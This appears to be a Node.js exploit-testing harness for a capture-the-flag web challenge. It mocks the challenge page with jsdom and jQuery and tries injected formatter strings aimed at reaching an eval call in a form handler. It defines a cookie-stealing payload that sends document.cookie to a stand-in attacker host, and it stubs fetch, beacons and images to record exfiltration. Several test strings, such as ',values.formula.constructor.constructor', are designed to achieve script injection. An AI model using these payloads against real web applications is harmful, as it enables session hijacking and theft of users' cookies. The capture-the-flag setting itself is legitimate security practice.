"use strict";
const { JSDOM } = require("jsdom");
const dom = new JSDOM(
  `<!DOCTYPE html><html><body>
     <form id="poly_standard" data-formula="x+y">
       <input id="x_standard" name="x" value="1">
       <input id="y_standard" name="y" value="2">
       <input name="formula" value="x + y">
       <div id="template_standard" hidden>Template loaded.</div>
       <button type="submit">Evaluate</button>
     </form>
     <pre id="answer"></pre>
   </body></html>`,
  { url: "https://polynomial.secso.cc/" }
);
global.window = dom.window;
global.document = dom.window.document;
global.navigator = dom.window.navigator;
global.top = dom.window; global.self = dom.window; global.frames = dom.window;
global.parent = dom.window; global.globalThis = dom.window;
const $ = require("jquery");
dom.window.document.cookie = "flag=FLAG{fake_admin_cookie}";
const COOKIE_MARK = "FLAG{fake_admin_cookie}";

let exfil = [];
const hit = (tag, v) => { const s = tag + ":" + String(v); exfil.push(s); };
dom.window.fetch = global.fetch = (u, o) => { hit("fetch", u); return Promise.resolve({}); };
if (dom.window.navigator) { try { dom.window.navigator.sendBeacon = (u,d)=>{ hit("beacon", u+"|"+d); return true; }; } catch(e){} }
dom.window.Image = global.Image = class { set src(v){ hit("img", v); } };
dom.window.open = global.open = (u,n)=>hit("open", u+"|"+n);
dom.window.alert = global.alert = (a)=>hit("alert", a);
try { $.globalEval = (c)=>hit("globalEval", c); } catch(e){}

// realistic handler pieces
function getSelectedFormatter(f){ return f.id.replace("poly_",""); }
function getFormulaFromForm(f){ return $(f).attr("data-formula") || "x + y"; }
function getCurrentFormValues(f){ const fd=new dom.window.FormData(f); return {x:String(fd.get("x")||""),y:String(fd.get("y")||""),formula:String(fd.get("formula")||"")}; }

function runHandler(format, attackerFormula){
  exfil = [];
  const form = dom.window.document.querySelector("form");
  form.id = "poly_" + format;
  if (attackerFormula !== undefined) {
    form.querySelector('[name=formula]').value = attackerFormula;
    form.setAttribute("data-formula", attackerFormula);
  }
  const selected = getSelectedFormatter(form);
  const values = getCurrentFormValues(form);
  let template;
  try { template = $("#template_" + selected); }
  catch (e) { return { format, result: "SELECTOR_THROW", detail: e.message.slice(0,70), exfil }; }
  if (template.length === 0) {
    try {
      const answer = (function(selected, values, $){
        "use strict";
        let type_;
        return eval("type_" + selected + "(this, selected)");
      }).call(form, selected, values, $);
      return { format, result: "EVAL_OK", answer: String(answer).slice(0,40), exfil };
    } catch (e) {
      return { format, result: "EVAL_THROW", detail: e.message.slice(0,90), exfil };
    }
  }
  return { format, result: "TEMPLATE_MATCH(no eval)", tlen: template.length, exfil };
}

const EXF = 'fetch("https://evil.example/?c="+document.cookie)';
const tests = [
  [",alert", undefined],
  [",alert(1)", undefined],
  [",eval.call", undefined],
  ["+eval.call", undefined],
  [",top.alert", undefined],
  [",window.alert", undefined],
  [",document.location.assign", undefined],
  [",open", undefined],
  // try to route to attacker formula (values.formula) execution:
  [",eval", EXF],
  [",values.formula.constructor.constructor", EXF],
  [",values.formula.constructor.constructor.call", EXF],
];
for (const [f, af] of tests) console.log(JSON.stringify(runHandler(f, af)));
